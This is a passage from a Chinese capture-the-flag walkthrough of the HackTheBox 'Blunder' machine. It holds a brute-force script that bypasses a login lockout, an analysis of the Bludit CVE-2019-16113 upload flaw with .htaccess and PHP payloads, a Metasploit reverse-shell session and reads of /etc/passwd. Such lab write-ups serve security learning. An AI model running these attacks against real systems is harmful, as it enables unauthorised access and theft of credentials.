class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'X-Forwarded-For'</span>: passwd,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: passwd,</span><br><span class="line">        <span class="string">'tokenCSRF'</span>: csrf_token,</span><br><span class="line">        <span class="string">'save'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(url=login_url, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'location'</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'/admin/dashboard'</span> <span class="keyword">in</span> login_result.headers[<span class="string">'location'</span>]:</span><br><span class="line">            print()</span><br><span class="line">            print(<span class="string">'SUCCESS: Password found!'</span>)</span><br><span class="line">            print(<span class="string">'Use &#123;u&#125; : &#123;p&#125; to login.'</span>.format(u=username, p=passwd))</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>运行找到密码为RolandDeschain：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~# python3 exp.py --url http:&#x2F;&#x2F;10.10.10.191 --username fergus</span><br><span class="line">[*] Tyring: CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https:&#x2F;&#x2F;digi.ninja&#x2F;)</span><br><span class="line">[*] Tyring: the</span><br><span class="line">[*] Tyring: Load</span><br><span class="line">......</span><br><span class="line">[*] Tyring: character</span><br><span class="line">[*] Tyring: RolandDeschain</span><br><span class="line"></span><br><span class="line">SUCCESS: Password found!</span><br><span class="line">Use fergus : RolandDeschain to login.</span><br></pre></td></tr></table></figure>

<h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>在Bludit 3.9.2中还存在一个文件上传漏洞，CVE-2019-16113。同样利用本地的环境来进行调试分析，访问页面<a href="http://your-host/buldit-3.9.2/admin/new-content" target="_blank" rel="noopener">http://your-host/buldit-3.9.2/admin/new-content</a> ，有一个上传图片的功能：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/11.png" alt="11"></p>
<p>首先上传一个<code>.htaccess</code>文件，会提示文件类型不支持，但是没关系，上传的文件会保存在临时文件夹中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine off</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/12.png" alt="12"></p>
<p>再上传一张包含恶意代码的图片shell.jpg，将<code>uuid</code>参数修改为<code>../../tmp</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/13.png" alt="13"></p>
<p>上传的图片保存在 <a href="http://your-host/bludit-3.9.2/bl-content/tmp/" target="_blank" rel="noopener">http://your-host/bludit-3.9.2/bl-content/tmp/</a> 下：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/14.png" alt="14"></p>
<p>访问该图片，显示phpinfo信息：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/15.png" alt="15"></p>
<p>漏洞代码在<code>bl-kernel/ajax/upload-images.php</code>中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> defined(<span class="string">'BLUDIT'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Bludit CMS.'</span>);</span><br><span class="line">header(<span class="string">'Content-Type: application/json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">| Upload an image to a particular page</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| @_POST['uuid']	string	Page uuid</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| <span class="doctag">@return</span>		array</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $_POST</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line">$uuid = <span class="keyword">empty</span>($_POST[<span class="string">'uuid'</span>]) ? <span class="keyword">false</span> : $_POST[<span class="string">'uuid'</span>];</span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set upload directory</span></span><br><span class="line"><span class="keyword">if</span> ($uuid &amp;&amp; IMAGE_RESTRICT) &#123;</span><br><span class="line">	$imageDirectory = PATH_UPLOADS_PAGES.$uuid.DS;</span><br><span class="line">	$thumbnailDirectory = $imageDirectory.<span class="string">'thumbnails'</span>.DS;</span><br><span class="line">	<span class="keyword">if</span> (!Filesystem::directoryExists($thumbnailDirectory)) &#123;</span><br><span class="line">		Filesystem::mkdir($thumbnailDirectory, <span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$imageDirectory = PATH_UPLOADS;</span><br><span class="line">	$thumbnailDirectory = PATH_UPLOADS_THUMBNAILS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$images = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($_FILES[<span class="string">'images'</span>][<span class="string">'name'</span>] <span class="keyword">as</span> $uuid=&gt;$filename) &#123;</span><br><span class="line">	<span class="comment">// Check for errors</span></span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">'images'</span>][<span class="string">'error'</span>][$uuid] != <span class="number">0</span>) &#123;</span><br><span class="line">		$message = $L-&gt;g(<span class="string">'Maximum load file size allowed:'</span>).<span class="string">' '</span>.ini_get(<span class="string">'upload_max_filesize'</span>);</span><br><span class="line">		Log::set($message, LOG_TYPE_ERROR);</span><br><span class="line">		ajaxResponse(<span class="number">1</span>, $message);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Convert URL characters such as spaces or quotes to characters</span></span><br><span class="line">	$filename = urldecode($filename);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Move from PHP tmp file to Bludit tmp directory</span></span><br><span class="line">	Filesystem::mv($_FILES[<span class="string">'images'</span>][<span class="string">'tmp_name'</span>][$uuid], PATH_TMP.$filename);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Transform the image and generate the thumbnail</span></span><br><span class="line">	$image = transformImage(PATH_TMP.$filename, $imageDirectory, $thumbnailDirectory);</span><br><span class="line">	<span class="keyword">if</span> ($image) &#123;</span><br><span class="line">		$filename = Filesystem::filename($image);</span><br><span class="line">		array_push($images, $filename);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$message = $L-&gt;g(<span class="string">'File type is not supported. Allowed types:'</span>).<span class="string">' '</span>.implode(<span class="string">', '</span>,$GLOBALS[<span class="string">'ALLOWED_IMG_EXTENSION'</span>]);</span><br><span class="line">		Log::set($message, LOG_TYPE_ERROR);</span><br><span class="line">		ajaxResponse(<span class="number">1</span>, $message);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajaxResponse(<span class="number">0</span>, <span class="string">'Images uploaded.'</span>, <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'images'</span>=&gt;$images</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>bludit会先将上传的文件保存在<code>bl-content/tmp</code>目录下：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/16.png" alt="16"></p>
<p>接着执行到第45行，调用<code>transformImage</code>函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">| This function checks the image extension,</span></span><br><span class="line"><span class="comment">| generate a new filename to not overwrite the exists,</span></span><br><span class="line"><span class="comment">| generate the thumbnail,</span></span><br><span class="line"><span class="comment">| and move the image to a proper place</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| <span class="doctag">@file</span>		string	Path and filename of the image</span></span><br><span class="line"><span class="comment">| <span class="doctag">@imageDir</span>	string	Path where the image is going to be stored</span></span><br><span class="line"><span class="comment">| <span class="doctag">@thumbnailDir</span>	string	Path where the thumbnail is going to be stored, if you don't set the variable is not going to create the thumbnail</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| <span class="doctag">@return</span>	string/boolean	Path and filename of the new image or FALSE if there were some error</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transformImage</span><span class="params">($file, $imageDir, $thumbnailDir=false)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $site;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check image extension</span></span><br><span class="line">	$fileExtension = Filesystem::extension($file);</span><br><span class="line">	$fileExtension = Text::lowercase($fileExtension);</span><br><span class="line">	<span class="keyword">if</span> (!in_array($fileExtension, $GLOBALS[<span class="string">'ALLOWED_IMG_EXTENSION'</span>]) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Generate a filename to not overwrite current image if exists</span></span><br><span class="line">	$filename = Filesystem::filename($file);</span><br><span class="line">	$nextFilename = Filesystem::nextFilename($imageDir, $filename);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Move the image to a proper place and name</span></span><br><span class="line">	$image = $imageDir.$nextFilename;</span><br><span class="line">	Filesystem::mv($file, $image);</span><br><span class="line">	chmod($image, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Generate Thumbnail</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($thumbnailDir)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($fileExtension == <span class="string">'svg'</span>) &#123;</span><br><span class="line">			symlink($image, $thumbnailDir.$nextFilename);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$Image = <span class="keyword">new</span> Image();</span><br><span class="line">			$Image-&gt;setImage($image, $site-&gt;thumbnailWidth(), $site-&gt;thumbnailHeight(), <span class="string">'crop'</span>);</span><br><span class="line">			$Image-&gt;saveImage($thumbnailDir.$nextFilename, $site-&gt;thumbnailQuality(), <span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $image;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数会检查文件的后缀名，如果文件名不合法则会返回false，如果文件名合法，会调用<code>Filesystem::mv</code>函数将文件保存到正确的位置，并赋予权限644。但是无论如何，上传的临时都会保存在<code>bl-content/tmp</code>目录下，这也是上传<code>.htaccess</code>成功的关键。</p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>在metasploit中搜索bludit，存在该文件上传漏洞利用模块：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search bludit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                          Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;linux&#x2F;http&#x2F;bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability</span><br></pre></td></tr></table></figure>

<p>需要提供登录的账户密码即可：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/bludit_upload_images_exec):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   BLUDITPASS                   yes       The password for Bludit</span><br><span class="line">   BLUDITUSER                   yes       The username for Bludit</span><br><span class="line">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI   /                yes       The base path for Bludit</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  149.28.149.93    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Bludit v3.9.2</span><br></pre></td></tr></table></figure>

<p>配置好后直接exploit反弹shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set BLUDITPASS RolandDeschain</span><br><span class="line">BLUDITPASS =&gt; RolandDeschain</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set BLUDITUSER fergus</span><br><span class="line">BLUDITUSER =&gt; fergus</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set RHOSTS 10.10.10.191</span><br><span class="line">RHOSTS =&gt; 10.10.10.191</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set LHOST 10.10.14.35</span><br><span class="line">LHOST =&gt; 10.10.14.35</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.35:4444 </span><br><span class="line">[+] Logged in as: fergus</span><br><span class="line">[*] Retrieving UUID...</span><br><span class="line">[*] Uploading ptSFzpweYM.png...</span><br><span class="line">[*] Uploading .htaccess...</span><br><span class="line">[*] Executing ptSFzpweYM.png...</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.191</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.35:4444 -&gt; 10.10.10.191:37272) at 2020-10-30 11:13:56 +0000</span><br><span class="line">[+] Deleted .htaccess</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/bludit-3.9.2/bl-content/tmp</span><br><span class="line">=============================================</span><br><span class="line"></span><br><span class="line">Mode             Size  Type  Last modified              Name</span><br><span class="line">----             ----  ----  -------------              ----</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2020-10-30 11:13:56 +0000  thumbnails</span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown command: whoami.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>先查看<code>/etc/passwd</code>文件，有两个用户shaun和hugo：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">......</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">......</span><br><span class="line">gdm:x:124:129:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash</span><br><span class="line">temp:x:1002:1002:,,,:/home/temp:/bin/bash</span><br></pre></td></tr></table></figure>

<p>进入/home目录确实是这两个用户：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd /home</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home</span><br><span class="line">==============</span><br><span class="line"></span><br><span class="line">Mode             Size  Type  Last modified              Name</span><br><span class="line">----             ----  ----  -------------              ----</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2020-05-26 08:29:29 +0000  hugo</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2020-04-28 11:13:35 +0000  shaun</span><br></pre></td></tr></table></figure>

<p>进入hugo的目录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd hugo</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home/hugo</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">20666/rw-rw-rw-   0     cha   2020-10-30 05:58:23 +0000  .bash_history</span><br><span class="line">100644/rw-r--r--  220   fil   2019-11-28 09:59:55 +0000  .bash_logout</span><br><span class="line">100644/rw-r--r--  3771  fil   2019-11-28 09:59:55 +0000  .bashrc</span><br><span class="line">40700/rwx------   4096  dir   2020-04-27 13:29:47 +0000  .cache</span><br><span class="line">40700/rwx------   4096  dir   2019-11-28 11:37:37 +0000  .config</span><br><span class="line">40700/rwx------   4096  dir   2020-04-27 13:30:11 +0000  .gnupg</span><br><span class="line">40775/rwxrwxr-x   4096  dir   2019-11-28 10:03:01 +0000  .local</span><br><span class="line">40700/rwx------   4096  dir   2020-04-27 13:29:46 +0000  .mozilla</span><br><span class="line">100644/rw-r--r--  807   fil   2019-11-28 09:59:55 +0000  .profile</span><br><span class="line">40700/rwx------   4096  dir   2020-04-27 13:30:11 +0000  .ssh</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Desktop</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Documents</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Downloads</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Music</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Pictures</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Public</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Templates</span><br><span class="line">40755/rwxr-xr-x   4096  dir   2019-11-28 11:36:30 +0000  Videos</span><br><span class="line">100400/r--------  33    fil   2020-10-30 06:30:20 +0000  user.txt</span><br></pre></td></tr></table></figure>

<p>在/home/hugo下发现了user.txt，但是这个文件的只有hugo才能读取，其他用户读取肯定失败：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat user.txt</span><br><span class="line">[-] core_channel_open: Operation failed: 1</span><br></pre></td></tr></table></figure>

<p>在/home/shaun目录下也没什么可以利用的文件，所以先将目光放回/var/www文件夹，在该目录下，发现了两个版本的bludit ：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode             Size  Type  Last modified              Name</span><br><span class="line">----             ----  ----  -------------              ----</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2020-05-19 14:13:22 +0000  bludit-3.10.0a</span><br><span class="line">40775/rwxrwxr-x  4096  dir   2020-04-28 11:18:03 +0000  bludit-3.9.2</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2019-11-28 09:34:02 +0000  html</span><br></pre></td></tr></table></figure>

<p>当反弹shell后，我们所在的目录路径就是bludit-3.9.2，在/var/www/bludit-3.9.2/bl-content/下发现了<code>databases</code>文件夹，进入该目录，发现了<code>users.php</code>文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/bludit-3.9.2/bl-content</span><br><span class="line">=========================================</span><br><span class="line"></span><br><span class="line">Mode             Size  Type  Last modified              Name</span><br><span class="line">----             ----  ----  -------------              ----</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2020-05-19 10:28:55 +0000  databases</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2020-04-28 10:24:28 +0000  pages</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2020-10-30 15:33:41 +0000  tmp</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2019-11-27 07:40:55 +0000  uploads</span><br><span class="line">40755/rwxr-xr-x  4096  dir   2019-11-27 11:53:41 +0000  workspaces</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd databases</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/bludit-3.9.2/bl-content/databases</span><br><span class="line">===================================================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  438    fil   2020-04-28 10:24:44 +0000  categories.php</span><br><span class="line">100644/rw-r--r--  3437   fil   2020-04-28 10:35:30 +0000  pages.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2019-11-27 11:53:41 +0000  plugins</span><br><span class="line">100644/rw-r--r--  42952  fil   2020-10-30 10:54:59 +0000  security.php</span><br><span class="line">100644/rw-r--r--  1319   fil   2020-05-19 10:28:54 +0000  site.php</span><br><span class="line">100644/rw-r--r--  2276   fil   2020-04-28 10:24:44 +0000  syslog.php</span><br><span class="line">100644/rw-r--r--  52     fil   2020-04-28 10:24:44 +0000  tags.php</span><br><span class="line">100644/rw-r--r--  1268   fil   2020-04-28 10:20:36 +0000  users.php</span><br></pre></td></tr></table></figure>

